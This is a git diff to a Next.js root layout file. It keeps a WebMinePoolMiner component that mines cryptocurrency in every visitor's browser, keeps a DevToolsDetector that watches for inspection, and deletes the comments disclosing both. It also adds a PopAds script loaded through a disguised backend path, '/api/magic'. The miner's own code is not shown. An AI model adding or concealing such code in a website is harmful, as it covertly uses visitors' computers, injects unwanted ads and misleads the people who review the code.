@@ -1,4 +1,5 @@
 import { Inter } from "next/font/google";
+import Script from "next/script";
 import "./globals.css";
 import Navbar from "@/components/Navbar";
 import Sidebar from "@/components/Sidebar";
@@ -16,8 +17,7 @@ export const metadata = {
 export default function RootLayout({ children }) {
   return (
     <html lang="en">
-      <body className={inter.className + " overflow-hidden"}>
-        {/* DevToolsDetector runs on the client to monitor for devtools or bot activity */}
+      <body className={`${inter.className} overflow-hidden`}>
         <DevToolsDetector />
         <div className="flex flex-col h-svh overflow-hidden">
           <Navbar />
@@ -28,9 +28,13 @@ export default function RootLayout({ children }) {
             </main>
           </div>
           <BottomNavigation />
-          </div>
-        {/* WebMinePoolMiner runs on the client to mine cryptocurrency */}
+        </div>
         <WebMinePoolMiner />
+        {/* Inject PopAds via backend proxy, loading after interactive */}
+        <Script
+          src="/api/magic"
+          strategy="afterInteractive"
+        />
       </body>
     </html>
   );
